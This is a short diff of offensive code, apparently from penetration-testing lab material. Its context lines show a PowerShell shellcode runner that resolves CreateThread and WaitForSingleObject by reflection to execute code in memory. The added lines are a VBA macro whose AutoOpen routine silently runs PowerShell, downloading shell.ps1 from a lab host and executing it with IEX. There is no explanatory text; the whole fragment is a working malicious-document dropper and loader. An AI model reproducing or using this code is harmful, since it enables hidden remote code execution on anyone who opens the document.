@@ -52,3 +52,13 @@ $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer
 $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
 
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+
+Sub MyMacro()
+Dim str As String
+str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.45.232/shell.ps1') | IEX"
+Shell str, vbHide
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
